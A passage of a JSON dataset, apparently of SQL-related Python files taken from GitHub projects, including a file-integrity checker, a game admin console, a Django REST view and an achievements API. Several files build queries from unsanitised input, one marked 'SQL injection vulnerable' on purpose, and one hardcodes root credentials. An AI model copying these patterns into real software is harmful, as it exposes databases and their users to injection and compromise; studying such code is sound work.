all_full.append({\n            \"id\": id,\n            \"sheet_id\": sheet_id,\n            \"student_id\": student_id,\n            \"time\": time,\n            \"files_path\": files_path,\n            \"primary_alias\": primary_alias,\n            \"grader\": grader,\n            \"decipoints\": decipoints,\n            \"status\": status if status else \"Unbearbeitet\"\n        })\n\n    return all_full\n\n\ndef get_current_full(db):\n    current_submission = []\n\n    for sub in get_all_full(db):\n        found_older_submission_index = -1\n        found_correct_student_and_sheet = False\n\n        for index, cursub in enumerate(current_submission):\n            if sub[\"student_id\"] == cursub[\"student_id\"] and sub[\"sheet_id\"] == cursub[\"sheet_id\"]:\n                found_correct_student_and_sheet = True\n                if sub[\"time\"] > cursub[\"time\"]:\n                    found_older_submission_index = index\n                break\n\n        if not found_correct_student_and_sheet:\n            # We found no previous submission from this student for this sheet\n            current_submission.append(sub)\n        elif found_older_submission_index > -1:\n            # We found the student/sheet combination but it is older (based on the timestamp)\n            # than the one we are checking for\n            current_submission[found_older_submission_index] = sub\n\n    return current_submission\n\n\ndef get_all_newest(db):\n    db.cursor.execute(\"\"\"SELECT id, sheet_id, student_id, time, files_path FROM\n                         submission ORDER BY time DESC\"\"\")\n    rows = db.cursor.fetchall()\n\n    registered = set()\n    submissions = []\n    for row in rows:\n        id, sheet_id, student_id, time, files_path = row\n        if (sheet_id, student_id) in registered:\n            continue\n        registered.add((sheet_id, student_id))\n        submissions.append(Submission(*row))\n\n    return submissions\n\n\ndef get_from_id(db, submission_id):\n    db.cursor.execute(\"\"\"SELECT id, sheet_id, student_id, time, files_path, deleted FROM submission\n                         WHERE id = ?\"\"\", (submission_id, ))\n    row = db.cursor.fetchone()\n    if not row:\n        raise ValueError('Cannot find submission')\n    return Submission(*row)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/CSCfi/lega-mirroring/blob/569fef16ecb89588210b85aa8eaf63f75249e0ea",
        "file_path": "/cf_dir.py",
        "source": "#!/usr/bin/env python\nimport mysql.connector\nimport os\nimport time\nimport datetime\nimport calendar\nimport hashlib\nimport sys\nimport argparse\n\n# Establish database connection\ndb = mysql.connector.connect(host=\"localhost\",\n                             user=\"root\",\n                             passwd=\"root\",\n                             db=\"elixir\",\n                             buffered=True)\n\ncur = db.cursor()\n\n\ndef get_file_size(path):\n    \"\"\" This function reads a file and returns\n    it's byte size as numeral string \"\"\"\n    return os.path.getsize(path)\n\n\ndef get_file_age(path):\n    \"\"\" This function reads a file and returns it's last\n    modified date as mtime(float) in string form \"\"\"\n    return os.path.getmtime(path)\n\n\ndef get_time_now():\n    \"\"\" This function returns the current time\n    as mtime(float) in string form \"\"\"\n    return calendar.timegm(time.gmtime())\n\n\ndef db_get_file_details(path):\n    \"\"\" This function queries the database for details\n    and returns a list of results or false \"\"\"\n    status = {'id': 0,\n              'name': 0,\n              'size': 0,\n              'age': 0,\n              'passes': 0,\n              'verified': 0}\n    cur.execute('SELECT * '\n                'FROM files '\n                'WHERE name=\"' + path + '\";')\n    result = cur.fetchall()\n    if cur.rowcount >= 1:\n        for row in result:\n            # See other/db_script.txt for table structure\n            status = {'id': row[0],\n                      'name': path,\n                      'size': int(row[2]),\n                      'age': float(row[3]),\n                      'passes': row[4],\n                      'verified': row[5]}\n    return status\n\n\ndef db_update_file_details(path):\n    \"\"\" This function updates file size and age to database\n    as well as resets the passes value to zero\"\"\"\n    file_size = get_file_size(path)\n    file_age = get_file_age(path)\n    file_id = db_get_file_details(path)['id']\n    params = [file_size, file_age, file_id]\n    cur.execute('UPDATE files '\n                'SET size=%s, '\n                'age=%s, '\n                'passes=0 '\n                'WHERE id=%s;',\n                params)\n    db.commit()\n    return\n\n\ndef db_increment_passes(path):\n    \"\"\" This function increments the number of passes by 1 \"\"\"\n    file_id = db_get_file_details(path)['id']\n    file_passes = db_get_file_details(path)['passes']+1\n    params = [file_passes, file_id]\n    cur.execute('UPDATE files '\n                'SET passes=%s '\n                'WHERE id=%s;',\n                params)\n    db.commit()\n    return\n\n\ndef db_insert_new_file(path):\n    \"\"\" This function creates a new database entry database\n    table structure can be viewed in other\\db_script.txt \"\"\"\n    file_size = get_file_size(path)\n    file_age = get_file_age(path)\n    params = [path, file_size, file_age]\n    cur.execute('INSERT INTO files '\n                'VALUES (NULL, %s, %s, %s, 0, 0);',\n                params)\n    db.commit()\n    return\n\n\ndef log_event(path):\n    \"\"\" This function prints the event to log \"\"\"\n    time_now = get_time_now()\n    file_size = db_get_file_details(path)['size']\n    file_age = db_get_file_details(path)['age']\n    file_passes = db_get_file_details(path)['passes']\n    print(time_now, '>', path,\n          ' Current size: ', file_size,\n          ' Last updated: ', file_age,\n          ' Number of passes: ', file_passes)\n    return\n\n\ndef hash_md5_for_file(path):\n    \"\"\" This function reads a file and returns a\n    generated md5 checksum \"\"\"\n    hash_md5 = hashlib.md5()\n    with open(path, 'rb') as f:\n        for chunk in iter(lambda: f.read(4096), b''):\n            hash_md5.update(chunk)\n        path_md5 = hash_md5.hexdigest()\n    return path_md5\n\n\ndef get_md5_from_file(path):\n    \"\"\" This function reads a file type file.txt.md5\n    and returns the  md5 checksum \"\"\"\n    key_md5 = path + '.md5'\n    key_md5 = open(key_md5, 'r')\n    key_md5 = key_md5.read()\n    return key_md5\n\n\ndef db_verify_file_integrity(path):\n    \"\"\" This function updates file verified status from 0 to 1 \"\"\"\n    file_id = db_get_file_details(path)['id']\n    params = [1, file_id]\n    cur.execute('UPDATE files '\n                'SET verified=%s '\n                'WHERE id=%s;',\n                params)\n    db.commit()\n    return\n\n\n'''*************************************************************'''\n#                         cmd-executable                          #\n'''*************************************************************'''\n\n\ndef main(arguments=None):\n    \"\"\" This function runs the script when executed and given\n    a directory as parameter \"\"\"\n    path = parse_arguments(arguments).message\n    for file in os.listdir(path):\n        if file.endswith('.txt'):\n            if db_get_file_details(file)['id'] > 0:\n                # Old file\n                if db_get_file_details(file)['verified'] == 0:\n                    # File is not verified\n                    if (get_file_size(file) >\n                        db_get_file_details(file)['size']):\n                        # File size has changed\n                        db_update_file_details(file)\n                    else:\n                        # File size hasn't changed\n                        if (get_time_now() -\n                            db_get_file_details(file)['age']) > 60:\n                            # File is older than 60s\n                            if db_get_file_details(file)['passes'] >= 3:\n                                # At least 3 passes\n                                if (hash_md5_for_file(file) ==\n                                    get_md5_from_file(file)):\n                                    # Verify md5 checksum\n                                    db_verify_file_integrity(file)\n                            else:\n                                # Increment passes\n                                db_increment_passes(file)\n                    log_event(file)\n            else:\n                # New file\n                db_insert_new_file(file)\n                log_event(file)\n    return\n\n\ndef parse_arguments(arguments):\n    \"\"\" This function returns the parsed argument (path) \"\"\"\n    parser = argparse.ArgumentParser()\n    parser.add_argument('message')\n    return parser.parse_args(arguments)\n\n\nif __name__ == '__main__':\n    RETVAL = main()\n    sys.exit(RETVAL)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/TED-996/krait-twostones/blob/1a0c62935c87189f7f510986c724a3a871618fcf",
        "file_path": "/site-root/.py/ctrl/admin/user_console.py",
        "source": "import json\r\nimport urllib\r\nimport math\r\nimport cx_Oracle\r\n\r\nfrom db_access import db_ops\r\nfrom model import user\r\nfrom db_access.exceptions import printException, printf, get_error_message\r\n\r\nclass UserConsoleController(object):\r\n\titems_per_page = 20\r\n\r\n\tdef __init__(self, request):\r\n\t\t# List of strings, each is an error. Add with self.error_messages.append(error_message)\r\n\t\tself.error_messages = []\r\n\r\n\t\ttry:\r\n\t\t\tdb_conn = db_ops.get_connection()\r\n\t\texcept cx_Oracle.DatabaseError, exception:\r\n\t\t\tdel self.error_messages[:]\r\n\t\t\tself.error_messages.append(\"Sorry, but we could't connect to the WEGAS Database\\n\")\r\n\t\t\tself.error_messages.append(exception)\r\n\t\t\t\r\n\t\tquery = request.query\r\n\t\tself.page = int(query.get(\"page\", 1))\r\n\t\tself.filter = query.get(\"filter\", \"\")\r\n\t\tself.max_page = self.get_page_count(db_conn, self.filter)\r\n\t\tprint \"for a total max page of {}\".format(self.max_page)\r\n\t\t\r\n\t\terror_msg_json = query.get(\"errors\", None)\r\n\t\tif error_msg_json is not None:\r\n\t\t\tself.error_messages += json.loads(error_msg_json)\r\n\t\t\r\n\t\t# List of objects of type User \r\n\t\tself.users = self.get_users(db_conn, self.page, self.filter)\r\n\r\n\t\tself.fetch_id = query.get(\"fetch_id\", \"\")\r\n\t\tif self.fetch_id is not \"\":\r\n\t\t\tfetch_user = self.get_user(self.fetch_id)\r\n\t\t\tself.fetch_username, self.fetch_password, self.fetch_mmr, self.fetch_level =\\\r\n\t\t\t\tfetch_user.name, \"\", fetch_user.mmr, fetch_user.playerLevel\r\n\t\telse:\r\n\t\t\tself.fetch_username, self.fetch_password, self.fetch_mmr, self.fetch_level = \"\", \"\", \"\", \"\"\r\n\r\n\t\tself.page_prev_url = None if self.page == 1 else build_link(self.page - 1, self.filter, self.fetch_id)\r\n\t\tself.page_next_url = None if self.page == self.max_page else build_link(self.page + 1, self.filter, self.fetch_id)\r\n\r\n\t\tmin_page = max(self.page - 4, 1)\r\n\t\tmax_page = min(self.max_page, min_page + 10)\r\n\t\tself.pages = [(nr, build_link(nr, self.filter, self.fetch_id)) for nr in xrange(min_page, max_page + 1)]\r\n\t\t# TODO: handle errors and add error messages\r\n\t\t\r\n\tdef get_users(self, conn, page, name_filter):\r\n\t\tcursor = conn.cursor()\r\n\t\ttry:\r\n\t\t\tcursor.execute(\"select * from table(user_ops.getUsers(:row_start, :row_count, :filter))\",\r\n\t\t\t\t{\r\n\t\t\t\t\t\"row_start\": int((page - 1) * UserConsoleController.items_per_page + 1),\r\n\t\t\t\t\t\"row_count\": int(UserConsoleController.items_per_page),\r\n\t\t\t\t\t\"filter\": str(name_filter)\r\n\t\t\t\t}\r\n\t\t\t)\r\n\t\t\treturn [user.User(*row) for row in cursor]\r\n\t\texcept cx_Oracle.DatabaseError, exception:\r\n\t\t\tprint 'Failed to get users from WEGAS'\r\n\t\t\tprintException(exception)\r\n\t\t\tself.error_messages.append('Faild to get users from WEGAS\\n')\r\n\t\t\tself.error_messages.append(exception)\r\n\r\n\tdef get_user(self, conn, user_id):\r\n\t\tcursor = conn.cursor()\r\n\r\n\t\tcursor.execute(\"select * from player where id = :id\", {\"id\": user_id})\r\n\t\treturn user.User(*(cursor.fetchone()))\r\n\r\n\tdef get_page_count(self, conn, name_filter):\r\n\t\tcursor = conn.cursor()\r\n\t\tif filter:\r\n\t\t\t# SQL injection secured:\r\n\t\t\t# cursor.execute(\"select count(*) from player where playername like '%' || :name_filter || '%'\", {\"name_filter\": name_filter})\r\n\t\t\t# SQL injection vulnerable:\r\n\t\t\tstmt = \"select count(*) from player where playername like '%{}%'\".format(name_filter)\r\n\t\t\tprint stmt\r\n\t\t\tcursor.execute(stmt)\r\n\t\telse:\r\n\t\t\tcursor.execute(\"select count(*) from player\")\t\r\n\t\tnr_raw = cursor.fetchone()[0]\r\n\t\tprint \"Total {} users matching filter\".format(nr_raw)\r\n\t\treturn int(math.ceil(float(nr_raw) / UserConsoleController.items_per_page))\r\n\r\n\t\ttry:\r\n\t\t\tcursor.execute(\"select * from players where id = :id\", {\"id\": user_id})\r\n\t\t\treturn users.User(*(cursor.fetchone()))\r\n\t\texcept cx_Oracle.DatabaseError, exception:\r\n\t\t\tself.error_messages.append('Sorry, we couldn\\'t find the user for your ID \\n')\r\n\t\t\tself.error_messages.append(exception)\r\n\r\n\tdef get_view(self):\r\n\t\t#return \".view/admin/admin_page.html\"\r\n\t\treturn \".view/admin/admin_page.html\"\r\n\r\n\r\ndef build_link(page, name_filter, fetch_id):\r\n\tlink_base = \"/admin/user_console\"\r\n\tif page is None and filter is None and fetch_id is None:\r\n\t\treturn link_base\r\n\t\r\n\tlink_query = link_base + \"?\"\r\n\tlink_chr = \"\"\r\n\r\n\tif page is not None:\r\n\t\tlink_query += link_chr + \"page=\" + urllib.quote_plus(str(page))\r\n\t\tlink_chr = '&'\r\n\r\n\tif name_filter:\r\n\t\t link_query += link_chr + \"filter=\" + urllib.quote_plus(str(name_filter))\r\n\t\t link_chr = '&'\r\n\r\n\tif fetch_id:\r\n\t\tlink_query += link_chr + \"fetch_id=\" + urllib.quote_plus(str(fetch_id))\r\n\t\tlink_chr = '&'\r\n\r\n\treturn link_query\r\n\r\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ridhoq/soundslike/blob/d45460ef045843c711536a4a24973d73d0aa7569",
        "file_path": "/app/api/songs.py",
        "source": "from flask import jsonify, request, make_response, g\nfrom sqlalchemy.exc import IntegrityError\nfrom . import api\nfrom .. import db, auth\nfrom ..models import Song\nfrom .errors import bad_request, route_not_found\n\n@api.route('/songs/<name>')\ndef song(name):\n    return jsonify(name=name)\n\n@api.route('/songs/<int:id>')\ndef get_song(id):\n    song = Song.query.filter_by(id=id).first()\n    if not song:\n        return route_not_found(song)\n    return make_response(jsonify(song.to_json()), 200)\n\n@api.route('/songs/', methods=['POST'])\n@auth.login_required\ndef new_song():\n    # check if json\n    if request.headers['content_type'] == 'application/json':\n        payload = request.get_json()\n\n        # validate payload\n        if not request.json or \\\n        not 'title' in payload or \\\n        not 'artist' in payload or \\\n        not 'url' in payload:\n            message = 'the payload aint right'\n            return bad_request(message)\n\n        # validate that song doesn't already exist\n        # TODO: this needs to be way more sophisticated\n        if Song.query.filter_by(url=payload['url']).first():\n            message = 'this song already exists'\n            return bad_request(message)\n\n        # add song\n        try:\n            song = Song(title=payload['title'], \\\n                        artist=payload['artist'], \\\n                        url=payload['url'], \\\n                        user=g.current_user)\n            db.session.add(song)\n            db.session.commit()\n            return make_response(jsonify(song.to_json()), 200)\n        except IntegrityError:\n            message = 'this song already exists'\n            return bad_request(message)\n        except AssertionError as ex:\n            return bad_request(ex.args[0])\n        except Exception as ex:\n            template = \"An exception of type {0} occured. Arguments:\\n{1!r}\"\n            message = template.format(type(ex).__name__, ex.args)\n            return bad_request(message)\n\n    else:\n        message = 'that aint json'\n        return bad_request(message)\n\n@api.route('/songs/<int:id>/related')\ndef get_song_relations(id):\n    top = request.args.get('top')\n    song = Song.query.filter_by(id=id).first()\n    if not song:\n        return route_not_found(song)\n    return make_response(jsonify(song.get_related_songs_json(top)), 200)\n\n\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/iedparis8/django_apogee/blob/9272c5d7208439f2c84233f9b424d156a5e9931d",
        "file_path": "/django_apogee/views/rest.py",
        "source": "from django_filters import MethodFilter\nfrom rest_framework import viewsets, filters\nfrom rest_framework.response import Response\nfrom django_apogee.models import InsAdmEtp, InsAdmEtpInitial, Individu\nfrom django_apogee.serializers import (InsAdmEtpSerializer,\n                                       InsAdmEtpInitialSerializer,\n                                       IndividuSerializer,\n                                      )\nfrom django.db import connections\n\nclass InsAdmEtpViewSet(viewsets.ModelViewSet):\n    queryset = InsAdmEtp.objects.all()\n    serializer_class = InsAdmEtpSerializer\n    paginate_by = 100\n\n    def list(self, request):\n        if request.GET.get('cod_anu', None):\n            self.queryset = InsAdmEtp.objects.filter(cod_anu__in=request.GET.getlist('cod_anu'))\n\n        return super(InsAdmEtpViewSet, self).list(request)\n\n\nclass InsAdmEtpInitialFilter(filters.FilterSet):\n    range = MethodFilter(action='range_filter')\n    class Meta:\n        model = InsAdmEtpInitial\n        fields = [\n            # COMPOSITE KEY\n            'cod_anu',\n            'cod_ind',\n            'cod_etp',\n            'cod_vrs_vet',\n            'num_occ_iae',\n            # others\n            'cod_cge',\n            'cod_dip',\n        ]\n\n    def range_filter(self, queryset, value):\n        start, stop = value.split(':')\n        return queryset[start:stop]\n\n\nclass InsAdmEtpInitialViewSet(viewsets.ReadOnlyModelViewSet):\n    queryset = InsAdmEtpInitial.objects.using('oracle').all()\n    serializer_class = InsAdmEtpInitialSerializer\n    filter_backends = (filters.DjangoFilterBackend,)\n    filter_class = InsAdmEtpInitialFilter\n    # paginate_by = 100\n\n    def head(self, request):\n\n        r = Response()\n        where_clause = \"\"\n        where_or_and = lambda wc: \"AND\" if where_clause else \"WHERE\"\n\n        # if request.GET.get('cod_anu', None):\n        #     where_clause += \" %s COD_ANU=%s\" % (where_or_and(where_clause),\n        #                                         request.GET.get('cod_anu'))\n        #\n        # if request.GET.get('cod_cge', None):\n        #     where_clause += \" %s COD_CGE='%s'\" % (where_or_and(where_clause),\n        #                                           request.GET.get('cod_cge'))\n        #\n        # if request.GET.get('cod_etp', None):\n        #     where_clause += \" %s COD_ETP='%s'\" % (where_or_and(where_clause),\n        #                                           request.GET.get('cod_etp'))\n        #\n        # if request.GET.get('cod_dip', None):\n        #     where_clause += \" %s COD_DIP='%s'\" % (where_or_and(where_clause),\n        #                                           request.GET.get('cod_dip'))\n\n        fields = [\n            # COMPOSITE KEY\n            (str, 'cod_anu'),\n            (int, 'cod_ind'),\n            (str, 'cod_etp'),\n            (int, 'cod_vrs_vet'),\n            (int, 'num_occ_iae'),\n            # others\n            (str, 'cod_cge'),\n            (str, 'cod_dip'),\n        ]\n        for field in fields:\n            t, f = field\n            if request.GET.get(f, None):\n                if t is str:\n                    where_clause += \" %s %s='%s'\" % (where_or_and(where_clause),\n                                                     f.upper(),\n                                                     request.GET.get(f))\n                elif t is int:\n                    where_clause += \" %s %s=%s\" % (where_or_and(where_clause),\n                                                   f.upper(),\n                                                   request.GET.get(f))\n\n        print where_clause\n\n        cursor = connections['oracle'].cursor()\n        sql_request = \"SELECT COUNT(*) FROM INS_ADM_ETP\" + where_clause\n        cursor.execute(sql_request)\n        r['X-Duck-Count'] = cursor.fetchone()[0]\n        return r\n\n    def list(self, request):\n\n        if not request.GET.get('range', None):\n            # The table is too big and segfault the django process so range parameter is mandatory\n            self.queryset = InsAdmEtpInitial.objects.none()\n            # TODO define a maximum length range\n\n        r = super(InsAdmEtpInitialViewSet, self).list(request)\n\n        return r\n\n    def retrieve(self, request, pk=None):\n        try:\n            cod_anu, cod_ind, cod_etp, cod_vrs_vet, num_occ_iae = pk.split('|')\n            inscription = InsAdmEtpInitial.objects.using('oracle').filter(cod_anu=cod_anu,\n                                                        cod_ind=cod_ind,\n                                                        cod_etp=cod_etp,\n                                                        cod_vrs_vet=cod_vrs_vet,\n                                                        num_occ_iae=num_occ_iae)[0]\n            return Response(self.serializer_class(inscription).data)\n\n        except:\n            return super(InsAdmEtpInitialViewSet, self).retrieve(request, pk)\n\n\nclass IndividuViewSet(viewsets.ModelViewSet):\n    queryset = Individu.objects.using('oracle').all()\n    serializer_class = IndividuSerializer\n    paginate_by = 100\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/FAForever/api/blob/58c44c6f1e84e20fc08d37c1536455c4e759f16c",
        "file_path": "/api/achievements.py",
        "source": "from flask import request\n\nfrom api import *\n\nimport faf.db as db\n\nSELECT_ACHIEVEMENTS_QUERY = \"\"\"SELECT\n                    ach.id,\n                    ach.type,\n                    ach.total_steps,\n                    ach.revealed_icon_url,\n                    ach.unlocked_icon_url,\n                    ach.initial_state,\n                    ach.experience_points,\n                    COALESCE(name_langReg.value, name_lang.value, name_def.value) as name,\n                    COALESCE(desc_langReg.value, desc_lang.value, desc_def.value) as description\n                FROM achievement_definitions ach\n                LEFT OUTER JOIN messages name_langReg\n                    ON ach.name_key = name_langReg.key\n                        AND name_langReg.language = %(language)s\n                        AND name_langReg.region = %(region)s\n                LEFT OUTER JOIN messages name_lang\n                    ON ach.name_key = name_lang.key\n                        AND name_lang.language = %(language)s\n                LEFT OUTER JOIN messages name_def\n                    ON ach.name_key = name_def.key\n                        AND name_def.language = 'en'\n                        AND name_def.region = 'US'\n                LEFT OUTER JOIN messages desc_langReg\n                    ON ach.description_key = desc_langReg.key\n                        AND desc_langReg.language = %(language)s\n                        AND desc_langReg.region = %(region)s\n                LEFT OUTER JOIN messages desc_lang\n                    ON ach.description_key = desc_lang.key\n                        AND desc_lang.language = %(language)s\n                LEFT OUTER JOIN messages desc_def\n                    ON ach.description_key = desc_def.key\n                        AND desc_def.language = 'en'\n                        AND desc_def.region = 'US'\"\"\"\n\n\n@app.route('/achievements')\ndef achievements_list():\n    \"\"\"Lists all achievement definitions.\n\n    HTTP Parameters::\n\n        language    string  The preferred language to use for strings returned by this method\n        region      string  The preferred region to use for strings returned by this method\n\n    :return:\n        If successful, this method returns a response body with the following structure::\n\n            {\n              \"updated_achievements\": [\n                {\n                  \"id\": string,\n                  \"name\": string,\n                  \"description\": string,\n                  \"type\": string,\n                  \"total_steps\": integer,\n                  \"initial_state\": string,\n                  \"experience_points\": integer,\n                  \"revealed_icon_url\": string,\n                  \"unlocked_icon_url\": string\n                }\n              ]\n            }\n    \"\"\"\n    language = request.args.get('language', 'en')\n    region = request.args.get('region', 'US')\n\n    with db.connection:\n        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)\n        cursor.execute(SELECT_ACHIEVEMENTS_QUERY + \" ORDER BY `order` ASC\",\n                       {\n                           'language': language,\n                           'region': region\n                       })\n\n        return flask.jsonify(items=cursor.fetchall())\n\n\n@app.route('/achievements/<achievement_id>')\ndef achievements_get(achievement_id):\n    \"\"\"Gets an achievement definition.\n\n    HTTP Parameters::\n\n        language    string  The preferred language to use for strings returned by this method\n        region      string  The preferred region to use for strings returned by this method\n\n    :param achievement_id: ID of the achievement to get\n\n    :return:\n        If successful, this method returns a response body with the following structure::\n\n            {\n              \"id\": string,\n              \"name\": string,\n              \"description\": string,\n              \"type\": string,\n              \"total_steps\": integer,\n              \"initial_state\": string,\n              \"experience_points\": integer,\n              \"revealed_icon_url\": string,\n              \"unlocked_icon_url\": string\n            }\n    \"\"\"\n    language = request.args.get('language', 'en')\n    region = request.args.get('region', 'US')\n\n    with db.connection:\n        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)\n        cursor.execute(SELECT_ACHIEVEMENTS_QUERY + \"WHERE ach.id = %(achievement_id)s\",\n                       {\n                           'language': language,\n                           'region': region,\n                           'achievement_id': achievement_id\n                       })\n\n        return cursor.fetchone()\n\n\n@app.route('/achievements/<achievement_id>/increment', methods=['POST'])\ndef achievements_increment(achievement_id):\n    \"\"\"Increments the steps of the achievement with the given ID for the currently authenticated player.\n\n    HTTP Parameters::\n\n        player_id    integer ID of the player to increment the achievement for\n        steps        string  The number of steps to increment\n\n    :param achievement_id: ID of the achievement to increment\n\n    :return:\n        If successful, this method returns a response body with the following structure::\n\n            {\n              \"current_steps\": integer,\n              \"current_state\": string,\n              \"newly_unlocked\": boolean,\n            }\n    \"\"\"\n    # FIXME get player ID from OAuth session\n    player_id = int(request.form.get('player_id'))\n    steps = int(request.form.get('steps', 1))\n\n    return flask.jsonify(increment_achievement(achievement_id, player_id, steps))\n\n\n@app.route('/achievements/<achievement_id>/setStepsAtLeast', methods=['POST'])\ndef achievements_set_steps_at_least(achievement_id):\n    \"\"\"Sets the steps of an achievement. If the steps parameter is less than the current number of steps\n     that the player already gained for the achievement, the achievement is not modified.\n     This function is NOT an endpoint.\"\"\"\n    # FIXME get player ID from OAuth session\n    player_id = int(request.form.get('player_id'))\n    steps = int(request.form.get('steps', 1))\n\n    return flask.jsonify(set_steps_at_least(achievement_id, player_id, steps))\n\n\n@app.route('/achievements/<achievement_id>/unlock', methods=['POST'])\ndef achievements_unlock(achievement_id):\n    \"\"\"Unlocks an achievement for the currently authenticated player.\n\n    HTTP Parameters::\n\n        player_id    integer ID of the player to unlock the achievement for\n\n    :param achievement_id: ID of the achievement to unlock\n\n    :return:\n        If successful, this method returns a response body with the following structure::\n\n            {\n              \"newly_unlocked\": boolean,\n            }\n    \"\"\"\n    # FIXME get player ID from OAuth session\n    player_id = int(request.form.get('player_id'))\n\n    return flask.jsonify(unlock_achievement(achievement_id, player_id))\n\n\n@app.route('/achievements/<achievement_id>/reveal', methods=['POST'])\ndef achievements_reveal(achievement_id):\n    \"\"\"Reveals an achievement for the currently authenticated player.\n\n    HTTP Parameters::\n\n        player_id    integer ID of the player to reveal the achievement for\n\n    :param achievement_id: ID of the achievement to reveal\n\n    :return:\n        If successful, this method returns a response body with the following structure::\n\n            {\n              \"current_state\": string,\n            }\n    \"\"\"\n    # FIXME get player ID from OAuth session\n    player_id = int(request.form.get('player_id'))\n\n    return flask.jsonify(reveal_achievement(achievement_id, player_id))\n\n\n@app.route('/achievements/updateMultiple', methods=['POST'])\ndef achievements_update_multiple():\n    \"\"\"Updates multiple achievements for the currently authenticated player.\n\n    HTTP Body:\n        In the request body, supply data with the following structure::\n\n            {\n              \"player_id\": integer,\n              \"updates\": [\n                \"achievement_id\": string,\n                \"update_type\": string,\n                \"steps\": integer\n              ]\n            }\n\n        ``updateType`` being one of \"REVEAL\", \"INCREMENT\" or \"UNLOCK\"\n\n    :return:\n        If successful, this method returns a response body with the following structure::\n\n            {\n              \"updated_achievements\": [\n                \"achievement_id\": string,\n                \"current_state\": string,\n                \"current_steps\": integer,\n                \"newly_unlocked\": boolean,\n              ],\n            }\n    \"\"\"\n    # FIXME get player ID from OAuth session\n    player_id = request.json['player_id']\n\n    updates = request.json['updates']\n\n    result = dict(updated_achievements=[])\n\n    for update in updates:\n        achievement_id = update['achievement_id']\n        update_type = update['update_type']\n\n        update_result = dict(achievement_id=achievement_id)\n\n        if update_type == 'REVEAL':\n            reveal_result = reveal_achievement(achievement_id, player_id)\n            update_result['current_state'] = reveal_result['current_state']\n            update_result['current_state'] = 'REVEALED'\n        elif update_type == 'UNLOCK':\n            unlock_result = unlock_achievement(achievement_id, player_id)\n            update_result['newly_unlocked'] = unlock_result['newly_unlocked']\n            update_result['current_state'] = 'UNLOCKED'\n        elif update_type == 'INCREMENT':\n            increment_result = increment_achievement(achievement_id, player_id, update['steps'])\n            update_result['current_steps'] = increment_result['current_steps']\n            update_result['current_state'] = increment_result['current_state']\n            update_result['newly_unlocked'] = increment_result['newly_unlocked']\n        elif update_type == 'SET_STEPS_AT_LEAST':\n            set_steps_at_least_result = set_steps_at_least(achievement_id, player_id, update['steps'])\n            update_result['current_steps'] = set_steps_at_least_result['current_steps']\n            update_result['current_state'] = set_steps_at_least_result['current_state']\n            update_result['newly_unlocked'] = set_steps_at_least_result['newly_unlocked']\n\n        result['updated_achievements'].append(update_result)\n\n    return result\n\n\n@app.route('/players/<int:player_id>/achievements')\ndef achievements_list_player(player_id):\n    \"\"\"Lists the progress of achievements for a player.\n\n    :param player_id: ID of the player.\n\n    :return:\n        If successful, this method returns a response body with the following structure::\n\n            {\n              \"items\": [\n                {\n                  \"achievement_id\": string,\n                  \"state\": string,\n                  \"current_steps\": integer,\n                  \"create_time\": long,\n                  \"update_time\": long\n                }\n              ]\n            }\n    \"\"\"\n    with db.connection:\n        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)\n        cursor.execute(\"\"\"SELECT\n                            achievement_id,\n                            current_steps,\n                            state,\n                            UNIX_TIMESTAMP(create_time) as create_time,\n                            UNIX_TIMESTAMP(update_time) as update_time\n                        FROM player_achievements\n                        WHERE player_id = '%s'\"\"\" % player_id)\n\n        return flask.jsonify(items=cursor.fetchall())\n\n\ndef increment_achievement(achievement_id, player_id, steps):\n    steps_function = lambda current_steps, new_steps: current_steps + new_steps\n    return update_steps(achievement_id, player_id, steps, steps_function)\n\n\ndef set_steps_at_least(achievement_id, player_id, steps):\n    steps_function = lambda current_steps, new_steps: max(current_steps, new_steps)\n    return update_steps(achievement_id, player_id, steps, steps_function)\n\n\ndef update_steps(achievement_id, player_id, steps, steps_function):\n    \"\"\"Increments the steps of an achievement. This function is NOT an endpoint.\n\n    :param achievement_id: ID of the achievement to increment\n    :param player_id: ID of the player to increment the achievement for\n    :param steps: The number of steps to increment\n    :param steps_function: The function to use to calculate the new steps value. Two parameters are passed; the current\n    step count and the parameter ``steps``\n\n    :return:\n        If successful, this method returns a dictionary with the following structure::\n\n            {\n              \"current_steps\": integer,\n              \"current_state\": string,\n              \"newly_unlocked\": boolean,\n            }\n    \"\"\"\n    achievement = achievements_get(achievement_id)\n\n    with db.connection:\n        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)\n        cursor.execute(\"\"\"SELECT\n                            current_steps,\n                            state\n                        FROM player_achievements\n                        WHERE achievement_id = %s AND player_id = %s\"\"\",\n                       (achievement_id, player_id))\n\n        player_achievement = cursor.fetchone()\n\n        new_state = 'REVEALED'\n        newly_unlocked = False\n\n        current_steps = player_achievement['current_steps'] if player_achievement else 0\n        new_current_steps = steps_function(current_steps, steps)\n\n        if new_current_steps >= achievement['total_steps']:\n            new_state = 'UNLOCKED'\n            new_current_steps = achievement['total_steps']\n            newly_unlocked = player_achievement['state'] != 'UNLOCKED' if player_achievement else True\n\n        cursor.execute(\"\"\"INSERT INTO player_achievements (player_id, achievement_id, current_steps, state)\n                        VALUES\n                            (%(player_id)s, %(achievement_id)s, %(current_steps)s, %(state)s)\n                        ON DUPLICATE KEY UPDATE\n                            current_steps = VALUES(current_steps),\n                            state = VALUES(state)\"\"\",\n                       {\n                           'player_id': player_id,\n                           'achievement_id': achievement_id,\n                           'current_steps': new_current_steps,\n                           'state': new_state,\n                       })\n\n    return dict(current_steps=new_current_steps, current_state=new_state, newly_unlocked=newly_unlocked)\n\n\ndef unlock_achievement(achievement_id, player_id):\n    \"\"\"Unlocks a standard achievement. This function is NOT an endpoint.\n\n    :param achievement_id: ID of the achievement to unlock\n    :param player_id: ID of the player to unlock the achievement for\n\n    :return:\n        If successful, this method returns a dictionary with the following structure::\n\n            {\n              \"newly_unlocked\": boolean,\n            }\n    \"\"\"\n    newly_unlocked = False\n\n    with db.connection:\n        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)\n\n        cursor.execute('SELECT type FROM achievement_definitions WHERE id = %s', achievement_id)\n        achievement = cursor.fetchone()\n        if achievement['type'] != 'STANDARD':\n            raise 